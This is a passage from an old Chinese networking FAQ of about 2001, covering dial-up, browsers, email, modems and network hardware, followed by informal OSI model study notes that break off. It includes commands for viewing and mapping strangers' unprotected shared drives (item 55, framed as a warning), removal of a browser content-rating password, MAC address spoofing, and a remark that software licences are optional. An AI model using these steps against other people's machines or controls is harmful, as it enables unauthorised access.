    A:先用网页制作工具制作好页面，包含 javascript 也可以，不过最好不要外链 css 和 js 文件。然后在IE5.0 以上版本浏览，选择“文件/另存为/Web档案，单一文件(*.mht)”，然后再把后缀名改成 .eml 即可。  
 44,Q:OE 通讯簿中不能正常显示汉字，怎么办?
    A:打开 OE，点击“工具/选项/阅读”，再点击“国际设置”按纽，选中“为接受的所有邮件使用默认编码”选项。  
 45,Q:如何用 201 卡上网?
    A:在建立新的拨号连接时在电话号码处输入“201,1,卡号#,密码#,169”。其中“1”的意思是选择提示语言类别(1 为普通话，2 为英语)。  
 46,Q:如何能快速备份 OE5.5 的邮件?
   A:很简单，打开 OE，把要备份的邮件选中后拖出来放到一个文件夹中就可以了，还原的时候再拖放进去。  
 47,Q:目前的 Internet 访问方法：
    A:(1)电话+调制解调器的拨号方式，速率最高为 56Kbps；(2)ISDN(综合业务数字网)接入,速率 128Kbps；(3)DDN 专线接入,速率 64Kbps-2Mbps 可选；(4)帧中继，速率 19.2Kbps-2Mbps 可选；(5)ADSL(不对称数字用户服务线)，速率：下行8Mbps，上行 1Mbps；(6)DBS(直接广播卫星)；(7)VPN(虚拟专用网络)。  
 48,Q:什么是 ISP?
    A:ISP 即 Internet 服务提供商(Internet service Provider)。它提供互连网的拨入帐号，是网络最终用户进入 Internet 的入口和桥梁。我国目前最大的 ISP 是电信 163，有的城市还有金桥、瀛海威等互连网接入商。  
 49,Q:什么是 ICP?
    A:ICP 即 Internet 内容提供商(Internet Content Provider)。它主要在互连网上提供内容服务让用户查阅和检索，满足网民对信息的需要。目前，有的 ICP 直接向共享的用户收费，而大多数 ICP 则是向网民提供免费服务，建立用户群，再通过收取广告费用，寻求发展。  
 50,Q:如何输入网址但不被浏览器记录?
    A:Navigator 和 IE 会记录你在浏览器中输入的每个网址，你不妨验证一下：在工具栏下边的地址窗口中输入一个 URL地址，浏览器将把该地址记录在下拉菜单中，直到有其他项目取代了它。你可以通过下面的方法访问网站，而所使用的网址将不被记录：在这两个浏览器中都可以按下 Ctrl－O 键，然后在对话框中输入 URL 地址即可。  
 51,Q:清除高速缓存中的信息?
    A:IE 和 Navigator 都在硬盘中缓存你最近访问过的网页。当你再次访问这些网页时，高速缓存信息能够加快网页的访问速度，但这也向窥探者揭开了你的秘密。要清除高速缓存中的信息，在 Navigator 中可在 Edit 菜单中选择 Preferences，然后单击 Advanced 选项旁边的＋号，再单击 Cache，最后单击 Clear Disk Cache 按钮；在Explorer中，应在View菜单中选择 Internet Options，然后进入 General 选项卡，单击 Delete Files 按钮。你还可以对浏览器进行设置，使它根本不使用高速缓存。当然，这会减慢网页访问速度。在 Navigator 中，依次选择 Edit、Preferences、Advanced，单击 Cache，并把 Disk Cache 选项框的值设置为0。在 IE 中，依次选择 View、General 和 Settings，然后把滑块移动到最左端。  
 52,Q:在我们的机器上安装 SMTP 服务软件：
    A:可以在我们的桌面系统中安装一个 SMTP 服务软件，它可以直接将 E-mail 发至收信人的 POP3 邮件服务器上，不必经过众多 SMTP 服务器的存贮转发，保证信件的快捷、准确发送。这个软件是 ADR.EXE，可以在 http://www.mailutilities.com/index.html#3 或 http://www.newhua.com 下载(文件为 adr.zip,879k,至 2001 年 2 月最新版本为 1.61)。  
 53,Q:IE 浏览器中分级审查口令的清除：
    A:有意或无意，给IE 浏览器加上了分级审查口令，使有些站点不能访问或干脆进入不了浏览器，这时可以从注册表中直接删除主键 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Ratings 右边的 key 串值即可删除口令。  
 54,Q:用 Modem 连接两台电脑：
    A:首先保证两台机器都安装且设置好了 Modem，电话拨号正常。假设你要从 B 向 A 拨号。做法：在 A 电脑上的“拨号网络”里添加“拨号网络服务器”(用菜单项“连接\拨号网络服务器”，启用“允许拨入”)，然后从 B 电脑向 A 进行拨号即可(拨 A 电脑连接的电话号码)。  
 55,Q:小心你的共享盘:
    A:现在不少在 IT 类企业做事的人都有笔记本，为了工作方便常会在内部网里设置某些目录或整个驱动器共享但又没设定任何密码。看上去这些躲在公司防火墙后面的机器一时也许是安全的，但下了班回到家里呢? 如果该机拨号上网的话，那所有共享的资料就全暴露在网上了，不信? 那我们就用 DOS 看看吧： 
　　如果有人在聊天室、ICQ、OICQ、论坛或 IRC 里得到你的笔记本的 IP 地址，然后运行 MSDOS 程序，在DOS 下有一个叫 Net 的外部命令，比如你的 IP 是 10.1.1.XXX，则在 DOS 中键入
Net view \\10.1.1.XXX　如果你设有共享目录的话，就会出现以下信息(如图)：




　　对方可以看到你设置了五个共享区：“A”不用说，这一定是小驱；“ELVAPLUS”是某一个目录；“F”大概是光驱吧，要是整个驱动器共享的话，那就太糟了吧；“MY DOCUMENTS”这个目录很重要哦，不少人做的企划、报表都放在这里面；还有一个“????”这是个中文目录名，如果是 Win98 的话在 DOS 下输入 pdos95 就能切换到中文 DOS 状态了。
　　如果你的目录没有设保护的话，对方在 DOS 下键入：
net use j: //10.1.1.XX/F: 
按下回车，正常的话，你的 F: 盘就映射为你的 J: 盘了，接下去对方想怎么做就不由你啦！
　　……看到这里您是不是有点怕怕啊? 其实还有很多专门的工具是查共享的，只要设定一个 IP 的扫描范围，它就可以自动查找这个范围中哪些机器有共享目录。所以说，为你的共享目录设个密码吧!  
 56,Q:CGI 安全漏洞资料速查 
 57,Q:短消息发送网站地址大放送(2001年8月发布)
    A: 
    网站    性质       编辑评价             推荐程度 
   中国特快 免费 功能非常强大，需要手机注册 ★★★★☆ 
      1257.com 免费 极富有个性化，需要手机注册 ★★★★★ 
      神通助理 免费 速度快，功能强，还DIY手机贺卡。需要手机注册 ★★★★★ 
      中国寻呼网 免费 需要手机注册,发送速度快，但功能比较单一 ★★★☆☆ 
      移动在线 免费 需要手机注册，发送特别方便实用 ★★★★☆ 
      短讯精灵 免费 不需注册，但千万别乱发…… ★★★☆☆ 
      短消息总管 免费 针对全球用户，不需注册 ★★★☆☆ 
      网易服务站 收费 需要注册用户，大量的点播服务 ★★★☆☆ 
      新浪短信息服务 收费 需要注册用户，大量的点播服务 ★★★☆☆ 
      SOHU短信 收费 需要注册用户，大量的点播服务 ★★★☆☆ 
      很酷网 收费 需要注册用户，速度快…… ★★★☆☆ 
      注意：一定要先看看该网站的服务范围，不在服务范围内是不能享受这些短信息服务功能的。  
 58,Q:交换机的选择参数
    A:
   端口数量：8 口、16 口、24 口、12 口；
   端口速率：10M、100M、10/100M 自适应等；
   背板带宽：一般 24 口的交换机有 2.1G 的背板带宽就够了；
   支持的 MAC 地址数量：2K、8K 等；
   可堆叠：是否可以进行堆叠式并联扩展；
   V-Lan 功能：能否划分虚拟网；
   可网管功能：Telnet、浏览器管理；
   安装方式：机架式、台式。  
 59,Q:获取网卡的物理 MAC 地址
    A:在 Windows98 下运行命令 nbtstat 即可得到某机器的 MAC 地址。命令格式为：
      C:\>nbtstat -A {机器IP地址} 或
      C:\>nbtstat -a {机器名}
      如：nbtstat -a 192.168.0.1 即可得到 IP 地址为 192.168.0.1 的机器的网卡的 MAC 地址。  
 60,Q:修改操作系统中登记的网卡的 MAC 地址
   A:操作系统在使用网卡的 MAC 地址时，并不是实时的进行检测，而是取用已经事先登记的值。如果我们把这些登记的值进行修改，那么就骗过了操作系统，我们随便使用什么网卡都可以了。在 Windows 操作系统中，这些值也同样保存在注册表里。(假设网卡 MAC=00e04c3e26c5，同时假设只有一块网卡。)
   ◇Windows98、WindowsMe：
    [HKLM\System\CurrentControlSet\Services\Class\Net\0000]
    "NetWorkAddress"="00e04c3e26c5"
    [HKLM\System\CurrentControlSet\Services\Class\Net\0000\Ndi\Params\networkaddress]
    "default"="00e04c3e26c5"
    "paramdesc"="MAC Address"
   ◇Windows2000：
    [HKLM\System\CurrentControlSet\Services\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0000]
    "NetWorkAddress"="00e04c3e26c5"
    [HKLM\System\CurrentControlSet\Services\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}
    \0000\Ndi\Params\networkaddress]
    "default"="00e04c3e26c5"
    "paramdesc"="MAC Address"
   ◇Linux：
    修改步骤：首先关闭网卡设备(否则会报告系统忙)：/sbin/ifconfig eth0 down；然后执行命令：/sbin/ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE；最后启动网卡设备：/sbin/ifconfig eth0 up。  
 61,Q:为什么要修改网卡的 MAC 地址
    A:有些网管软件把网络工作站上的网卡 MAC 地址与机器的 IP 地址绑定起来。当工作站更换了网卡后，必须在网管软件里进行重新登记。为了方便起见，只要在工作站的 Windows 里修改一下登记的 MAC 地址就可以了。  
 62,Q:猫和声卡上都有音频输出和话筒插孔，它们在使用上有什么区别?
    A:猫上的插孔是打电话用的，就是通常说的带语音，而声卡上的插孔用于多媒体功能。两者不同的是，用猫上的孔打电话不需要特别的软件支持，而通过声卡上的孔打电话的话就需要软件支持，像 MediaRing 等等。  
 63,Q:国营单位要做上网工程，怎样“多”“快”“好”“省”?
    A:某网友问：“请问网络高手：本人所在的单位最近准备上局域网，原有微机二十台左右，分布于公司办公楼和各下属企业，主要想搞网络化管理和无纸化办公。请问：我该如何组织网络？硬件方面采用 10M 以太网是否能应付日常办公要求？拓扑结构是否应为总线型、星型相结合？软件方面宜采用何种 NOS？Windows NT、Windows2000 还是Linux？装 WindowsNT 或 Windows2000 等微软的 NOS ，是否必需为每个工作站单独购买许可证？价格大约多少？”
     参考答案如下：
   (1)、现在很多国营的单位都没钱，偏偏又要搞什么上网工程。“又想马儿跑，又想马儿不吃草”，花了 6、7 位数的钱，却什么成果也看不到，后果到是有的……建网得用钱开路，10M 以太网一般就够了，如果确定使用 10M 布线，就不要考虑什么“未来升级到100M”，否则林林总总的加起来，会和直接使用 100M 布线的价格差不多。但本人还是建议上 100M 网络，因为 100M 到桌面已经是目前的主流，否则会很快落后。
   (2)、网络拓扑目前流行的结构是星形网，技术已经非常成熟。当然主干网一般还是总线形的。
   (3)、至于网络操作系统，如果需求不是很复杂，你可以用 NT，就算服务器配置不高也无所谓，要实现同样的服务，Windows2000 对服务器的要求要比 NT 高很多。“授权”的价格可上可下，买的越多自然越便宜。有一点要注意，这个“授权”只不过是一种形式，买不买得看你们老总自觉不自觉。
   但是，考虑到目前的技术发展趋势，建议你使用 Windows2000，因为它的功能比 NT 要强大很多，一旦将来要扩展什么功能，就不用再掏“银子”了(毕竟，要老总掏一次钱不容易啊)。
   !：如果你技术够高，又勇于探索的话，Linux 是你的最佳选择。对于这个既便宜、稳定、又不用担心“侵权”的东东，我本人强烈推荐！毕竟，它是中国企业尤其是国营企业的希望。试想：如果一旦美国翻脸不认人，不再向中国市场提供 Windows 产品供货，你的企业能撑多久？而 Linux 中国已经有十多家生产企业。所以，为爱国计、为系统稳定计、为你本人的技术进步计……选用 Linux 吧！  
 64,Q:何谓“白猫”，何谓“黑猫”?
    A:3COM 的外置式 Modem，不带语音的是白的，反之是黑的，因为质量很好，在发烧友中很流行，故此得名。“不管黑猫白猫，逮住老鼠就是好猫。”  
 65,Q:为什么 56k Modem 的连线速度只有 33.6kbps 甚至更低?
    A:原因很多，比如电话线路状况不好，噪音太大等。另外，只有上网端的 Modem 与 ISP 的 Modem 支持同一种 56k 标准时，连线速度才能超过 33.6kbps。一般情况下，ISP 有很多种 Modem，用户能连上什么种类的 Modem，完全是随机的。56k 的 Modem 具有三种不同的标准：V.90，K56Flex 及 X2。  
 66,Q:网络服务器简介：
    A:服务器是网络环境下为客户提供某种服务的专用计算机。因为服务器在网络中是连续不断地工作的，且网络数据流在这里形成了一个瓶颈，所以服务器的数据处理速度和系统可靠性要比普通的计算机高得多。普通计算机死机了大不了重新启动，而服务器的当机有可能造成数据的大量丢失和整个网络的瘫痪，造成无法挽回的损失。
   网络服务器根据不同的分类标准可以分为许多种。
   1、按网络的规模分为工作组服务器、部门级服务器和企业级服务器。它们的硬件配置、可靠性、数据处理速度依次升高，可以应用在几十台、上百台、数百台等规模的网络上。它们目前的价格一般在 1-3 万、3-5 万、6-10 万不等(价格仅供参考)。
   2、按 CPU 技术构架可以分为 CISC 构架的服务器和 RISC 构架的服务器。 CISC 构架的服务器即 采用 Intel CPU 技术 的 PC 服务器；而 RISC 服务器指采用了非 Intel 技术的服务器，如采用 PowerPC、Alpha、RA-RISC、Sparc 等 RISC CPU 的服务器。RISC 构架服务器的性能比 CISC 服务器的性能高得多，在大型的、关键的领域中应用的比较多。但是近年来随着 PC 技术的迅速发展，IA 构架服务器的性能正在接近 RISC 服务器的性能。
   3、按用途分为通用型服务器和专用型服务器。目前大多数的服务器为通用型服务器。
   4、按外观分为台式服务器和机架式服务器。台式服务器有类似普通 PC 机的机箱，我们见的比较多。而机架式服务器更像个交换机，有 1U(1U=1.75英寸)、2U、4U 等规格。机架式服务器安装在标准为 19 英寸的机柜里面。  
 67,Q:用代理服务器上网的网络中(代理服务器 IP 为 192.168.0.1)，如何在客户端设置来收发 Email?
    A:POP3 和 SMTP 服务器都设成 192.168.0.1，帐号名设成：用户名#邮箱域名。如果代理服务器为 Msproxy，那么在客户端安装 MsProxy 客户端软件，然后所有的内容统统不需要再手动配置了。  
 68,Q:NT 启动之后所有的硬盘分区全都自动共享，请问怎样可以取消这一默认共享?
    A:不用担心，那并不是指您的这些分区在局域网上完全开放了，查看共享属性就可以发现，这只是表明这些分区对某些拥有高级别权限的用户(如 Administrator)开放。一般这种情况出现在 Nt4server 版本上。  
 69,Q:关于 IE5.x 浏览器的“自动完成功能”
         A:(1)、在登录网站时选择了“以后不再记住密码”，就丢失了“自动完成”功能。如果要再次使用它，可以在 Internet Explorer5.x 的“工具”菜单上，单击“Internet 选项”，单击“内容”选项卡，在“个人信息”中，单击“自动完成”，选中要使用的“自动完成”选项的复选框，确定。
   (2)、清除“自动完成”功能记录的信息：如果在网吧等一些公共场所上网，离开时应当清除掉自动完成”功能记录的一些信息。方法是，在进入上述的“自动完成”配置界面后，单击“清除表单”和“清除密码”按钮，即可清除掉历史记录。
   (3)、取消自动完成功能：在进入“自动完成”配置界面后，点选掉一些选项，按“确定”按钮。也可以在浏览器对“记住密码”进行提示时，选择“以后不再记住密码”。  
 70,Q:请问 ADSL(512K) 和有线通哪一个综合性能更佳?
    A:两者在浏览网页时速度高低很难分辨出来，Cable Modem 在下载软件时会快一点。不过要论性价比的话还是 ADSL 高一点，而且安装也很方便，无须改动现有线路。同时，使用 ADSL 可以独占带宽，而使用有线通的话，如果你周围的用户一多，速度就会明显减慢，因为它不是点对点的，你不能独享带宽。  
 71,Q:上网的连接速度在什么条件下能达到 115200 BPS?
    A:如果用的是 Modem 的话，可以肯定的说，绝对不可能达到 115200 BPS，这只是一个理想速率，可以通过修改驱动程序或是使用 Windows 默认的驱动程序显示出来，但实际连接速率决不会超过 56000 BPS。  
 72,Q:联想随机赠送的一个半年的上网帐号，在非联想机器上不能使用，为什么?
    A:联想电脑的免费上网帐号只能够设置在它的拨号软件“幸福拨号”下，才可以使用。  
 73,Q:解决 IE 无法浏览中文名的 html 文件的问题?
    A:修改 IE 的“Internet 选项”设置，在“高级”选项卡取消“始终以 UTF-8 发送 URL”。  
 74,Q:Realplay 如何通过 WinGate 浏览视频数据?
    A:Realplay 支持 http 代理，只要 WinGate 开了 http 代理就可以。  
 75,Q:集线器(Hub)能串联吗?
    A:为了拓展网络拓扑，Hub 当然可以级联。但其连接有讲究：只能通过下一级 Hub 的上行口(Uplink)连接到上一级 Hub 的任意非 Uplink 口。如果是不同速率的 Hub 级联，最好把低速连在下一级。现在买的 Hub 都提供有级联接口，而早期的 Hub 可能没有，如果要串联，可以制作特殊的网线接头来连接。Hub 还有信号放大的作用，可以通过 Hub 级联增加网络的伸展距离。不但 Hub 能级联，交换机也能进行级联扩展，同时，交换机还能进行堆叠式的并联扩展。现在，用交换机代替集线器已经是网络发展的必然趋势。  
 76,Q:在 IE5.x 浏览器中登录 FTP 站点
    A:在 IE 的地址栏输入 ftp://用户名[:密码]@FTP服务器IP[/虚拟目录]  
 77,Q:去掉 IE 浏览器标题栏字符串“Microsoft Internet Explorer”
    A:在 Windows 注册表的主键 HKLM\Software\Microsoft\Internet Explorer\Main 右添加子键 Window title，值为空串，也可以定义成你自己的字串。  
 78,Q:录制网上在线点播节目的声音拷贝：
    A:如果要把网上点播的节目的声音录下来，可以试试大名鼎鼎的音乐编辑制作软件 Cool Edit Pro 1.1。只要把声卡的输出信号作为声卡的 Line in 或话筒的信号源就完成了硬件的接线设置，就可以试着录音了。为了达到较满意的效果，制作接线时注意信号的匹配，可以考虑做适当的信号衰减。  
 79,Q:在线点播网上中央电祝台“2001 年春节晚会”精彩节目：
    A:中央电视台春节晚会是全世界华人都喜爱的节目，下面就是中央电视台“2001年春节晚会”在线点播网址： http://www.cctv.com.cn/specials/2001spring/2001jingcai.html。为了欣赏这些节目，需要安装微软的流式媒体在线收看软件 RealPlayer，目前最新版本是 8.0。这个软件目前只能收看不能保存节目，对左右声道的支持似乎也不太好。








三：电脑知识大杂烩
OSI.Open Systems Interconnection ------开放系统互连
OSI由重要计算机和远程通讯公司在1983年开始开发，最初的设想是成为一个接口规范。委员会决定建立一个通用参考模型，这样他人在其上就可以开发更为细节化的接口，从而成为标准。ISO采纳了OSI作为一个国际标准。
 在网络发展的初期，许多研究机构、计算机厂商和公司都大力发展计算机网络。从A R PA N E T(这个我想大家都应该知道一点点吧，第一代的实验网络）出现至今，已经推出了许多商品化的网络系统。这种自行发展的网络，在体系结构上差异很大以至于它们之间互不相容，难于相互连接以构成更大的网络系统。（哈哈，人类是聪明的，办法出现了。）
 为此，许多标准化机构积极开展了网络体系结构标准化方面的工作，其中最为著名的就是国际标准化组织I S O提出的开放系统互连参考模型O S I / R M。O S I参考模型是研究如何把开放式系统（即为了与其他系统通信而相互开放的系统）连接起来的标准。（这回大家知道，osi为什么要出现了吧，接下来在为大家具体的讲讲osi的内容。） 
OSI的核心是两个终端用户在远程通讯网络中的通讯可以分成层，每层有自己的功能集。（这个比较关键） 
     O S I参考模型将计算机网络分为7层，（呵呵，够多吧。）我们将从最底层开始，依次讨论模型的各层所要完成的功能。（我想画给大家来着，可惜从上小学到现在，美术没有及格过，所以。。。。。还是免了吧。） 
1. 物理层
物理层（physical layer）的主要功能是完成相邻结点之间原始比特流的传输。物理层协议关
心的典型问题是使用什么样的物理信号来表示数据“ 1”和“ 0”；一位持续的时间多长；数据
传输是否可同时在两个方向上进行；最初的连接如何建立和完成通信后连接如何终止；物理接
口（插头和插座）有多少针以及各针的用处。物理层的设计主要涉及物理层接口的机械、电气、
功能和过程特性，以及物理层接口连接的传输介质等问题。物理层的设计还涉及到通信工程领
域内的一些问题。（这一层表示了用户的软件与硬件之间的实际连接。它实际上与任何协议都不相干，但它定义了数据链路层所使用的访问方法。） 
  物理层是OSI参考模型的最低层，向下直接与物理传输介质相连接。物理层协议是各种网络设备进行互连时必须遵守的低层协议。设立物理层的目的是实现两个网络物理设备之间的二进制比特流的透明传输，对数据链路层屏蔽物理传输介质的特性，以便对高层协议有最大的透明性。 ISO对OSI参考模型中的物理层做了如下定义： 
　　物理层为建立、维护和释放数据链路实体之间的二进制比特传输的物理连接提供机械的、电气的、功能的和规程的特性。物理连接可以通过中继系统，允许进行全双工或半双工的二进制比特流的传输。物理层的数据服务单元是比特，它可以通过同步或异步的方式进行传输。（上面两段是我的笔记，大家好好看看，嘿嘿~~~~~~~写这段可不容易，因为我以前写字太难看了，现在看起来好费劲。） 
来个总结发言吧，哈哈~ 
物理层主要特点是： 
（1）物理层主要负责在物理连接上传输二进制比特流； 
（2）物理层提供为建立、维护和释放物理连接所需要的机械、电气、功能与规程的特性。 
（晕，怎么感觉这个总结是废话呢？） 
2. 数据链路层
数据链路层（ data link layer）的主要功能是如何在不可靠的物理线路上进行数据的可靠传输。数据链路层完成的是网络中相邻结点之间可靠的数据通信。为了保证数据的可靠传输，发送方把用户数据封装成帧（ f r a m e），并按顺序传送各帧。由于物理线路的不可靠，因此发送方发出的数据帧有可能在线路上发生出错或丢失（所谓丢失实际上是数据帧的帧头或帧尾出错），从而导致接收方不能正接收到数据帧。为了保证能让接收方对接收到的数据进行正确性判断，发送方为每个数据块计算出C R C（循环冗余检验）并加入到帧中，这样接收方就可以通过重新计算C R C来判断数据接收的正确性。一旦接收方发现接收到的数据有错，则发送方必须重传这一帧数据。然而，相同帧的多次传送也可能使接收方收到重复帧。比如，接收方给发送方的确认帧被破坏后，发送方也会重传上一帧，此时接收方就可能接收到重复帧。数据链路层必需解决由于帧的损坏、丢失和重复所带来的问题。（眼睛好累，明天继续吧，估计你也看累了，休息一会吧。） 
数据链路可以粗略地理解为数据通道（比较不负责的一句话） 
物理层要为终端设备间的数据通信提供传输媒体及其连接.媒体是长期的,连接是有生存期的.在连接生存期内,收发两端可以进行不等的一次或多次数据通信.每次通信都要经过建立通信联络和拆除通信联络两过程.这种建立起来的数据收发关系就叫作数据链路。（这个地方是重点，因为我学的时候容易把物理层和链路弄混，这个地方解释比较清楚。）而在物理媒体上传输的数据难免受到各种不可靠因素的影响而产生差错,为了弥补物理层上的不足,为上层提供无差错的数据传输,就要能对数据进行检错和纠错.数据链路的建立,拆除,对数据的检错,纠错是数据链路层的基本任务。（下面其实也一样一层为一层服务呗~~~~）。 
嘿嘿，在做一回总结。 
链路层的主要功能
链路层是为网络层提供数据传送服务的,这种服务要依靠本层具备的功能来实现。链路层应具备如下功能: 
1：链路连接的建立，拆除，分离。
2：帧定界和帧同步。链路层的数据传输单元是帧,协议不同,帧的长短和界面也有差别，但无论如何            必须对帧进行定界。 
3：顺序控制,指对帧的收发顺序的控制。
4：差错检测和恢复。还有链路标识,流量控制等等.差错检测多用方阵码校验和循环码校验来检测信    道上数据的误码,而帧丢失等用序号检测.各种错误的恢复则常靠反馈重发技术来完成。 
如果有人不知道“帧”是什么，那就自己找材料，我是不行了。 
数据链路层的主要协议
数据链路层协议是为发对等实体间保持一致而制定的,也为了顺利完成对网络层的服务。主要协议如下： 
ISO1745--1975:"数据通信系统的基本型控制规程".这是一种面向字符的标准,利用10个控制字符完成链路的建立，拆除及数据交换.对帧的收发情况及差错恢复也是靠这些字符来完成.ISO1155, ISO1177, ISO2626, ISO2629等标准的配合使用可形成多种链路控制和数据传输方式. 
ISO3309--1984:称为"HDLC 帧结构".ISO4335--1984:称为"HDLC 规程要素 ".ISO7809--1984:称为"HDLC 规程类型汇编".这3个标准都是为面向比特的数据传输控制而制定的.有人习惯上把这3个标准组合称为高级链路控制规程. 
ISO7776:称为"DTE数据链路层规程".与CCITT X.25LAB"平衡型链路访问规程"相兼容. （诶~~~~这个地方是在朋友家电脑里找到的，自己其实也没看明白。） 
链路，就介绍这么多啦，我想看到这里，基本该懂的也都懂了，我觉得我比我们老师讲的要细多了。 
3. 网络层
网络层（network layer）的主要功能是完成网络中主机间的报文传输，其关键问题之一是使
用数据链路层的服务将每个报文从源端传输到目的端。在广域网中，这包括产生从源端到目的
端的路由，并要求这条路径经过尽可能少的I M P。如果在子网中同时出现过多的报文，子网可能
形成拥塞，必须加以避免，此类控制也属于网络层的内容。
当报文不得不跨越两个或多个网络时，又会产生很多新问题。例如第二个网络的寻址方法
可能不同于第一个网络；第二个网络也可能因为第一个网络的报文太长而无法接收；两个网络
使用的协议也可能不同，等等。网络层必须解决这些问题，使异构网络能够互连。
在单个局域网中，网络层是冗余的，因为报文是直接从一台计算机传送到另一台计算机的，
因此网络层所要做的工作很少。 
网络层主要功能
网络层为建立网络连接和为上层提供服务,应具备以下主要功能： 
1路由选择和中继 
2激活,终止网络连接 
3在一条数据链路上复用多条网络连接,多采取分时复用技术
4差错检测与恢复
5排序,流量控制
6服务选择
7网络管理 
网络层标准简介
网络层的一些主要标准如下： 
ISO.DIS8208:称为"DTE用的X.25分组级协议" 
ISO.DIS8348:称为"CO 网络服务定义"(面向连接) 
ISO.DIS8349:称为"CL 网络服务定义"(面向无连接) 
ISO.DIS8473:称为"CL 网络协议" 
ISO.DIS8348:称为"网络层寻址" 
除上述标准外,还有许多标准。这些标准都只是解决网络层的部分功能,所以往往需要在网络层中同时使用几个标准才能完成整个网络层的功能.由于面对的网络不同,网络层将会采用不同的标准组合. 
ok，又搞定一层。-__-! 
补充一句 
在具有开放特性的网络中的数据终端设备,都要配置网络层的功能.现在市场上销售的网络硬设备主要有网关和路由器.HOHO~~~~~ 
4. 传输层
传输层（ transport layer）的主要功能是完成网络中不同主机上的用户进程之间可靠的数据
通信。
传输层要决定对会话层用户，最终对网络用户，提供什么样的服务。最好的传输连接是一
条无差错的、按顺序传送数据的管道，即传输层连接是真正端到端的。换言之，源端机上的某
进程，利用报文头和控制报文与目标机上的对等进程进行对话。在传输层下面的各层中，协议
是每台机器与它的直接相邻机器之间（主机- I M P、I M P-I M P）的协议，而不是最终的源端机和
目标机之间（主机-主机）的协议。在它们中间，可能还隔着多个I M P。即1至3层的协议是点到
点的协议，而4至7层的协议是端到端的协议。
由于绝大多数主机都支持多用户操作，因而机器上有多道程序，这意味着多条连接将进出
于这些主机，因此需要以某种方式区别报文属于哪条连接。识别这些连接的信息可以放入传输
层的报文头中。除了将几个报文流多路复用到一条通道上，传输层还必须管理跨网连接的建立
和拆除。这就需要某种命名机制，使机器内的进程能够讲明它希望交谈的对象。另外，还需要
有一种机制来调节信息流，使高速主机不会过快地向低速主机传送数据。尽管主机之间的流量
控制与I M P之间的流量控制不尽相同，但是稍后我们将看到类似的原理对二者都适用。 
其实我自己是这么想的，这一层就等于是端口到端口~不知道我这么理解对不对？ 
比如说A机器的QQ消息到了B机器的时候，就是通过这一层的相关协议找4000端口的。（我自己这么想的，如果不对，大家一定告诉我哦） 
第一个端到端的层次，具有缓冲作用。当网络层服务质量不能满足要求时，它将服务加以提高，以满足高层的要求；当网络层服务质量较好时，它只用很少的工作。传输层还可进行复用，即在一个网络连接上创建多个逻辑连接。　（这是在网上摘录的一句，比较经典，哈哈。） 
在补充一句：传输层也称为运输层.传输层只存在于端开放系统中,是介于低3层通信子网系统和高3层之间的一层,但是很重要的一层.因为它是源端到目的端对数据传送进行控制从低到高的最后一层. 
基本上就是这些啦，该交代的都交代了。在深如了解就的自己买书看了，没办法在网上发了 
恩，还有些内容，感觉不算是重点，还是放上来看看吧。 
有一个既存事实，即世界上各种通信子网在性能上存在着很大差异.例如电话交换网,分组交换网,公用数据交换网，局域网等通信子网都可互连,但它们提供的吞吐量,传输速率,数据延迟通信费用各不相同.对于会话层来说,却要求有一性能恒定的界面.传输层就承担了这一功能.它采用分流/合流，复用/介复用技术来调节上述通信子网的差异,使会话层感受不到. 
此外传输层还要具备差错恢复，流量控制等功能,以此对会话层屏蔽通信子网在这些方面的细节与差异.传输层面对的数据对象已不是网络地址和主机地址,而是和会话层的界面端口.上述功能的最终目的是为会话提供可靠的,无误的数据传输.传输层的服务一般要经历传输连接建立阶段,数据传送阶段,传输连接释放阶段3个阶段才算完成一个完整的服务过程.而在数据传送阶段又分为一般数据传送和加速数据传送两种。传输层服务分成5种类型.基本可以满足对传送质量,传送速度,传送费用的各种不同需要.传输层的协议标准有以下几种： 
ISO8072:称为"面向连接的传输服务定义" 
ISO8072:称为"面向连接的传输协议规范" 
5. 会话层
会话层（ session layer）允许不同机器上的用户之间建立会话关系。会话层允许进行类似传
输层的普通数据的传送，在某些场合还提供了一些有用的增强型服务。允许用户利用一次会话
在远端的分时系统上登录，或者在两台机器间传递文件。
会话层提供的服务之一是管理对话控制。会话层允许信息同时双向传输，或任一时刻只能
单向传输。如果属于后者，类似于物理信道上的半双工模式，会话层将记录此时该轮到哪一方。
一种与对话控制有关的服务是令牌管理（ token management）。有些协议保证双方不能同时进行
同样的操作，这一点很重要。为了管理这些活动，会话层提供了令牌，令牌可以在会话双方之
间移动，只有持有令牌的一方可以执行某种关键性操作。另一种会话层服务是同步。如果在平
均每小时出现一次大故障的网络上，两台机器间要进行一次两小时的文件传输，想想会出现什
么样的问题？每一次传输中途失败后，都不得不重新传送这个文件。当网络再次出现大故障时，
可能又会半途而废。为了解决这个问题，会话层提供了一种方法，即在数据中插入同步点。每
次网络出现故障后，仅仅重传最后一个同步点以后的数据。（不懂不懂不懂，7层这一层我基本上课的时候听不明白，问老师，由于问的太多了，最后老师把我开除了-__-!!。） 
为会话实体间建立连接。为给两个对等会话服务用户建立一个会话连接,应该做如下几项工作： 
1将会话地址映射为运输地址 
2选择需要的运输服务质量参数(QOS)
3对会话参数进行协商 
4识别各个会话连接 
5传送有限的透明用户数据 
总感觉这一层好象用处不大？？？？（个人意见 ，大家别用鸡蛋丢我哦） 
6. 表示层
表示层（ presentation layer）完成某些特定的功能，对这些功能人们常常希望找到普遍的解
决办法，而不必由每个用户自己来实现。值得一提的是，表示层以下各层只关心从源端机到目
标机可靠地传送比特，而表示层关心的是所传送的信息的语法和语义。表示层服务的一个典型
例子是用一种大家一致选定的标准方法对数据进行编码。大多数用户程序之间并非交换随机的
比特，而是交换诸如人名、日期、货币数量和发票之类的信息。这些对象是用字符串、整型数、
浮点数的形式，以及由几种简单类型组成的数据结构来表示。
网络上计算机可能采用不同的数据表示，所以需要在数据传输时进行数据格式的转换。例
如在不同的机器上常用不同的代码来表示字符串（ A S C I I和E B C D I C）、整型数（二进制反码或
补码）以及机器字的不同字节顺序等。为了让采用不同数据表示法的计算机之间能够相互通信
并交换数据，我们在通信过程中使用抽象的数据结构（如抽象语法表示A S N . 1）来表示传送的
数据，而在机器内部仍然采用各自的标准编码。管理这些抽象数据结构，并在发送方将机器的
内部编码转换为适合网上传输的传送语法以及在接收方做相反的转换等工作都是由表示层来完
成的。
另外，表示层还涉及数据压缩和解压、数据加密和解密等工作。 
这一层没什么好多说的了，看名字都知道是什么回事了。 
7. 应用层
